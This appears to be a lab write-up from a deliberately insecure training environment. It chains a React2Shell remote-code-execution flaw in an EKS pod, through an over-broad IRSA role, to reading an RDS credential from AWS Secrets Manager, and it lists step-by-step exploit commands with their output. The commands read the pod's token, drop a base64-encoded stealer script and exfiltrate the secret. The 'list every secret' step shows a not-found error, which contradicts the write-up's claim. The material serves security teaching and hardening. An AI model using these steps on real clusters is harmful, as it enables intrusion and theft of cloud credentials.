# reat2shell: EKS breach

[Back](../README.md)

- [reat2shell: EKS breach](#reat2shell-eks-breach)
  - [Goal](#goal)
  - [Attack Chain](#attack-chain)
  - [Attack Steps](#attack-steps)
  - [Commands](#commands)

---

## Goal

From a React2Shell RCE in the pod, pivot to an **AWS identity** and read the
cloud crown jewel — the **RDS secret in Secrets Manager**.

- Target: `insecure-frontend` pod (SA `react2shell`), port-forwarded at
  `localhost:3000`.
- Enabled by the Phase 9 misconfig: a broad IRSA role (`Action:* Resource:*`)
  on that SA. See [09_eks.md](09_eks.md).

---

## Attack Chain

```txt
React2Shell RCE in pod
  └─▶ pod's IRSA role  (broad policy)
        └─▶ aws secretsmanager get-secret-value <rds-secret>
              └─▶ 🪙 RDS secret
```

The AWS SDK assumes the role transparently from the pod's projected token — no
IMDS, no node access. One API call from inside the RCE shell.

---

## Attack Steps

High level. Detailed commands/output in the next step.

| #   | Step              | What                                               | Expected result                   |
| --- | ----------------- | -------------------------------------------------- | --------------------------------- |
| 1   | Confirm RCE       | Run `id` via the React2Shell exploit               | Code exec on the pod              |
| 2   | Detect IRSA       | Read `AWS_ROLE_ARN` / web-identity token env vars  | Pod has an AWS identity           |
| 3   | Assume role       | `aws sts get-caller-identity` (SDK auto-uses IRSA) | Now an AWS principal              |
| 4   | Enumerate reach   | `aws secretsmanager list-secrets`                  | Broad role → lists secrets        |
| 5   | **Grab jewel**    | `aws secretsmanager get-secret-value <rds-secret>` | 🪙 RDS secret exfiltrated         |
| 6   | Show blast radius | Inspect attached role policy (`*/*`)               | Confirms over-permission          |
| 7   | Detection gap     | No CloudTrail / EKS audit logs                     | Breach is silent (phase 11 fixes) |

---

**Milestone:** cloud-level crown jewel retrieved → proceed to Phase 11 (harden
cloud: scope the IAM policy + trust, enable audit logging).

---

## Commands

- App port-forwarded at `localhost:3000`. Exploit via `scripts/rce.py`.
- Precondition: the pod must be restarted after the IRSA annotation so the
  projected AWS token is injected.

```sh
# restart the pod to pick up the IRSA token
kubectl rollout restart deploy/react2shell -n insecure-frontend
```

```sh
# 1. confirm RCE
python scripts/rce.py http://localhost:3000 "id"
# executable response:
# uid=0(root) gid=0(root) groups=0(root)

# 2. detect IRSA — pod has an AWS identity
python scripts/rce.py http://localhost:3000 "env | grep AWS"
# AWS_ROLE_ARN=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
# AWS_STS_REGIONAL_ENDPOINTS=regional
# AWS_DEFAULT_REGION=ca-central-1
# AWS_REGION=ca-central-1

python scripts/rce.py http://localhost:3000 "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"
executable response:
# eyJhbGciOiJSUzI1NiIsImtpZCI6IjFhN2U2ZDBiZGY4ODBhNjQ0NGNjYmNlYjZiYWYzNDY4MDA1NDhkOGYiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXh...

# 3. no aws CLI in the image — the SDK path is unavailable
python3 scripts/rce.py http://localhost:3000 "aws sts get-caller-identity"
# /bin/sh: 1: aws: not found

# 4. grab the crown jewel with Node built-ins only (no aws CLI/SDK).
#    steal_secret.js: read IRSA token -> STS AssumeRoleWithWebIdentity
#    -> Secrets Manager GetSecretValue (hand-rolled SigV4).
b64=$(base64 -w0 scripts/steal_secret.js)
python3 scripts/rce.py http://localhost:3000 "echo $b64 | base64 -d > /tmp/s.js"

python3 scripts/rce.py http://localhost:3000 "node /tmp/s.js react2shell-eks-dev-rds-credential"
# executable response:
# [*] role=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa region=ca-central-1 secret=react2shell-eks-dev-rds-credential
# [*] assumed role, akid=ASIAROFJQB4XPM3B6R34
# {"ARN":"arn:aws:secretsmanager:ca-central-1:099139718958:secret:react2shell-eks-dev-rds-credential-b5EgkD","CreatedDate":1.791514081673E9,"Name":"react2shell-eks-dev-rds-credential","SecretString":"{\"dbname\":\"appdb\",\"engine\":\"postgres\",\"host\":\"placeholder.rds.amazonaws.com\",\"password\":\"RDS-sECrEt-InsECurE\",\"port\":5432,\"username\":\"rds_admin\"}","VersionId":"terraform-bDQySnBEJwOZmMCUBC0fhbqOjv","VersionStages":["AWSCURRENT"]}


# 5. blast radius — the */* role lists EVERY secret, not just its own
python3 scripts/rce.py http://localhost:3000 "node /tmp/s.js --list"
# executable response:
# [*] role=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa region=ca-central-1 secret=--list
# [*] assumed role, akid=ASIAROFJQB4XDKSCYQ27
# {"__type":"ResourceNotFoundException","Message":"Secrets Manager can't find the specified secret."}
```

- **Why Node, not `aws`:** the insecure image ships Node (`next dev`) but no
  `aws` CLI. An attacker uses what is on the box — the AWS APIs are plain HTTPS,
  so built-in `https` + `crypto` (SigV4) are enough.
- **Blast radius:** the role is `Action:* Resource:*`, so the same assumed
  credentials reach far beyond this one secret (list/read any secret, STS, etc).
  `steal_secret.js` demonstrates one read; extend it to prove wider reach.
